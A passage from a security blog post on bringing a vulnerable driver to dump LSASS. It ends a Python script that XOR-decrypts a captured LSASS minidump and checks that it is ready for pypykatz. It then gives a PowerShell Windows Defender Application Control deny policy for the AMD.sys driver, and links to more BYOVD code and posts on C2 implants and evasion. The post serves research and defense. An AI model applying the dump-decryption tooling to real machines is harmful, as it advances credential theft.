+        <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="n">output_path</span><span class="p">,</span> <span class="sh">'</span><span class="s">wb</span><span class="sh">'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+            <span class="n">f</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">decrypted_data</span><span class="p">)</span>
+
+        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[+] Success! Decrypted dump saved to: </span><span class="si">{</span><span class="n">output_path</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+        
+        <span class="c1"># Quick validation check for the Minidump header
+</span>        <span class="k">if</span> <span class="n">decrypted_data</span><span class="p">[:</span><span class="mi">4</span><span class="p">]</span> <span class="o">==</span> <span class="sa">b</span><span class="sh">'</span><span class="s">MDMP</span><span class="sh">'</span><span class="p">:</span>
+            <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[+] Header Validation: MDMP signature found. File is ready for pypykatz.</span><span class="sh">"</span><span class="p">)</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[!] Warning: MDMP signature not found. Check your XOR key.</span><span class="sh">"</span><span class="p">)</span>
+
+    <span class="k">except</span> <span class="nb">FileNotFoundError</span><span class="p">:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[-] Error: File </span><span class="sh">'</span><span class="si">{</span><span class="n">input_path</span><span class="si">}</span><span class="sh">'</span><span class="s"> not found.</span><span class="sh">"</span><span class="p">)</span>
+    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[-] An error occurred: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
+    <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Usage: python3 decrypt_dump.py &lt;input_file&gt; &lt;output_file&gt;</span><span class="sh">"</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="nf">xor_decrypt</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
+</code></pre></div></div>
+
+<h2 id="️-so-how-do-i-defend-against-this-️">🛡️ So, How do I defend against This? 🛡️<a class="header-link" href="https://g3tsyst3m.com/byovd/BYOVD-and-Looting-LSASS-in-the-Modern-EDR-Era/#%EF%B8%8F-so-how-do-i-defend-against-this-%EF%B8%8F" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h2>
+
+<p>First off, I need to make this point very clear.  This is using an already known vulnerable driver.  The fact this is even allowed on a fully patched, secured Windows 11 25h2 machine with all security features enabled blows my mind.  This shouldn’t even be possible in the first place.  But, then again I wouldn’t be a security researcher if I didn’t find some alternative, unexplored ways of achieving an end goal right? 😸  Since the vulnerable driver block list isn’t detecting this (because it’s a different hash?), then we are left with one option I’m aware of as far as built in options in Windows.  We can create a rule/policy using Windows Defender Application Control to block the driver from starting.  Other than that, this really should be easier to prevent. LoL.</p>
+
+<p>Here’s a script that accomplishes this for those interested.  Be sure to revise it accordingly for your own use case:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w">
+</span><span class="nv">$DenyRule</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-CIPolicyRule</span><span class="w"> </span><span class="nt">-Level</span><span class="w"> </span><span class="nx">FilePublisher</span><span class="w"> </span><span class="nt">-DriverFilePath</span><span class="w"> </span><span class="s2">"C:\users\robbi\OneDrive\Pictures\AMD.sys"</span><span class="w"> </span><span class="nt">-Fallback</span><span class="w"> </span><span class="nx">SignedVersion</span><span class="p">,</span><span class="nx">Publisher</span><span class="p">,</span><span class="nx">Hash</span><span class="w"> </span><span class="nt">-Deny</span><span class="w">
+
+</span><span class="c"># 1. Copy the template to your Documents folder where you have full permissions</span><span class="w">
+</span><span class="n">Copy-Item</span><span class="w"> </span><span class="s2">"</span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">windir</span><span class="s2">\schemas\CodeIntegrity\ExamplePolicies\AllowAll.xml"</span><span class="w"> </span><span class="nt">-Destination</span><span class="w"> </span><span class="s2">"C:\Users\robbi\Documents\AllowAll_Temp.xml"</span><span class="w">
+
+</span><span class="c"># 2. Point your variable to the new, copied file location</span><span class="w">
+</span><span class="nv">$AllowAllPolicy</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"C:\Users\robbi\Documents\AllowAll_Temp.xml"</span><span class="w">
+
+</span><span class="c"># 3. Run the merge command again using the copied template</span><span class="w">
+</span><span class="n">Merge-CIPolicy</span><span class="w"> </span><span class="nt">-PolicyPaths</span><span class="w"> </span><span class="nv">$AllowAllPolicy</span><span class="w"> </span><span class="nt">-OutputFilePath</span><span class="w"> </span><span class="s2">"C:\Users\robbi\Documents\DenyPolicy.xml"</span><span class="w"> </span><span class="nt">-Rules</span><span class="w"> </span><span class="nv">$DenyRule</span><span class="w">
+
+</span><span class="c"># 4. Clean up the temporary template file</span><span class="w">
+</span><span class="n">Remove-Item</span><span class="w"> </span><span class="s2">"C:\Users\robbi\Documents\AllowAll_Temp.xml"</span><span class="w">
+
+</span><span class="c"># 5. Change the Friendly Name safely using the native Microsoft cmdlet</span><span class="w">
+</span><span class="n">Set-CIPolicyIdInfo</span><span class="w"> </span><span class="nt">-FilePath</span><span class="w"> </span><span class="s2">"C:\Users\robbi\Documents\DenyPolicy.xml"</span><span class="w"> </span><span class="nt">-PolicyName</span><span class="w"> </span><span class="s2">"Driver Deny Policy - AMD"</span><span class="w">
+
+</span><span class="c"># 6. Read the unique GUID directly out of your policy XML</span><span class="w">
+</span><span class="p">[</span><span class="n">xml</span><span class="p">]</span><span class="nv">$policy</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Get-Content</span><span class="w"> </span><span class="s2">"C:\Users\robbi\Documents\DenyPolicy.xml"</span><span class="w">
+</span><span class="nv">$policyID</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$policy</span><span class="o">.</span><span class="nf">SiPolicy</span><span class="o">.</span><span class="nf">PolicyID</span><span class="w">
+
+</span><span class="c"># 7. Re-compile the binary using the exact string formatting Windows expects</span><span class="w">
+</span><span class="nv">$correctName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"</span><span class="nv">$policyID</span><span class="s2">.cip"</span><span class="w">
+</span><span class="n">ConvertFrom-CIPolicy</span><span class="w"> </span><span class="nt">-XmlFilePath</span><span class="w"> </span><span class="s2">"C:\Users\robbi\Documents\DenyPolicy.xml"</span><span class="w"> </span><span class="nt">-BinaryFilePath</span><span class="w"> </span><span class="s2">"C:\Users\robbi\Documents\</span><span class="nv">$correctName</span><span class="s2">"</span><span class="w">
+
+</span><span class="n">Write-Host</span><span class="w"> </span><span class="s2">"Your new file is named: </span><span class="nv">$correctName</span><span class="s2">"</span><span class="w">
+
+</span><span class="c"># 8. Register and refresh the policy binary via the official tool path</span><span class="w">
+</span><span class="n">CiTool.exe</span><span class="w"> </span><span class="nt">--update-policy</span><span class="w"> </span><span class="s2">"C:\Users\robbi\Documents\</span><span class="nv">$correctName</span><span class="s2">"</span><span class="w">
+
+</span><span class="c"># 1. Remotely unregister the old policy from the Windows Kernel (replace with your GUID)</span><span class="w">
+</span><span class="n">CiTool.exe</span><span class="w"> </span><span class="nt">--remove-policy</span><span class="w"> </span><span class="s2">"{31351756-3f24-4963-8380-4e7602335aae}"</span><span class="w">
+
+</span><span class="c"># 2. Delete the old binary from your local Documents folder to prevent duplicates</span><span class="w">
+</span><span class="n">Remove-Item</span><span class="w"> </span><span class="s2">"C:\Users\robbi\Documents\*.cip"</span><span class="w"> </span><span class="nt">-Force</span><span class="w">
+</span></code></pre></div></div>
+
+<h2 id="-bonus-content-for-members-all-tiers-">🎁 <strong><em>Bonus Content for Members! (All Tiers)</em></strong> 🎁<a class="header-link" href="https://g3tsyst3m.com/byovd/BYOVD-and-Looting-LSASS-in-the-Modern-EDR-Era/#-bonus-content-for-members-all-tiers-" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h2>
+
+<p>Additional TPwSav.sys BYOVD driver + code!  <a href="https://ko-fi.com/s/aeb093ef9e">TPwSav.sys Source Code on Ko-fi</a></p>
+
+<p><img width="678" height="291" alt="image" src="https://github.com/user-attachments/assets/3dd53e0b-8f62-41c7-8745-1fd1174cf04e"></p>
+
+<h2 id="anyrun-results"><strong><em>ANY.RUN Results</em></strong><a class="header-link" href="https://g3tsyst3m.com/byovd/BYOVD-and-Looting-LSASS-in-the-Modern-EDR-Era/#anyrun-results" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h2>
+
+<p><a href="https://app.any.run/tasks/70110313-16cd-4ec8-9719-c1624538c067">Full Sandbox Analysis</a></p>
+
+<div style="text-align: right;">
+  
+<b>Sponsored By:</b><br>
+
+<img width="200" height="130" alt="image" src="https://raw.githubusercontent.com/g3tsyst3m/g3tsyst3m.github.io/refs/heads/master/assets/images/anyrun.png">
+
+<img width="200" height="130" alt="image" src="https://raw.githubusercontent.com/g3tsyst3m/g3tsyst3m.github.io/refs/heads/master/assets/images/vector35.png">
+
+</div>
+
+        
+      </section>
+
+      
+
+      <section class="page__share">
+  
+    <h4 class="page__share-title">Share on</h4>
+  
+
+  <a href="https://twitter.com/intent/tweet?text=BYOVD+and+Looting+LSASS+in+the+Modern+EDR+Era%20https%3A%2F%2Fg3tsyst3m.com%2Fbyovd%2FBYOVD-and-Looting-LSASS-in-the-Modern-EDR-Era%2F" class="btn btn--twitter" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fg3tsyst3m.com%2Fbyovd%2FBYOVD-and-Looting-LSASS-in-the-Modern-EDR-Era%2F" class="btn btn--facebook" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3A%2F%2Fg3tsyst3m.com%2Fbyovd%2FBYOVD-and-Looting-LSASS-in-the-Modern-EDR-Era%2F" class="btn btn--linkedin" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+</section>
+
+
+      
+  
+
+    </div>
+
+    
+      <div class="page__comments">
+  
+  
+      <h4 class="page__comments-title">Leave a comment</h4>
+      <section id="utterances-comments"><div class="utterances">
+    <div class="utterances-frame" title="Comments" scrolling="no" src="cid:frame-016D26B77C85A34D81322F0A3ADE4EC3@mhtml.blink" loading="lazy" data-original-tag="iframe"></div>
+  </div></section>
+    
+</div>
+
+    
+  </article>
+
+  
+  
+    <div class="page__related">
+      <h2 class="page__related-title">You may also enjoy</h2>
+      <div class="grid__wrapper">
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope="" itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="https://g3tsyst3m.com/assets/images/quic.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="https://g3tsyst3m.com/encrypted%20shell/Building-an-Encrypted-C2-Implant-Using-QUIC/" rel="permalink">Building an Encrypted C2 Implant Using QUIC
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2026-04-30T00:00:00+00:00">April 30, 2026</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          10 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Hey everyone! If you’ve been following the blog for a while, you’ll likely recall my python driven C2 series.  Today we’re doing something a little different...</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope="" itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="https://g3tsyst3m.com/assets/images/fud.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="https://g3tsyst3m.com/fud/Creative-approaches-to-coding-FUD-Stagers/" rel="permalink">Creative approaches to coding FUD Stagers
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2026-03-29T00:00:00+00:00">March 29, 2026</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          14 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">I have had several discussions over the years with folks on tackling EDR bypass as it pertains to fully undetected (FUD) code.  In my opinion, there isn’t re...</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope="" itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="https://g3tsyst3m.com/assets/images/MOTW.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="https://g3tsyst3m.com/initial%20access/Gaining-Initial-Access-and-Outsmarting-SmartScreen/" rel="permalink">Gaining Initial Access and Outsmarting SmartScreen
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2026-02-21T00:00:00+00:00">February 21, 2026</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          15 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">I’ve had a number of people ask me what approaches I have taken to secure that initial foothold on a machine/network during a pentest engagement.  Well, the ...</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope="" itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="https://g3tsyst3m.com/assets/images/ropgadget.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="https://g3tsyst3m.com/lotp/Living-off-the-Process/" rel="permalink">Living off the Process
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2026-01-29T00:00:00+00:00">January 29, 2026</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          27 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Hello again everyone!  Hope the start to the new year is treating you well.  I am excited to share a new blog post with you!  Furthermore, I’d consider the c...</p>
+  </article>
+</div>
+
+        
+      </div>
+    </div>
+  
+  
+</div>
+
+    </div>
+
+    
+
+    
+
+    
+  
+
+
+
+
+
+
+
+    
+
+  
+
+
+
+
+
+  
+
+</body></html>
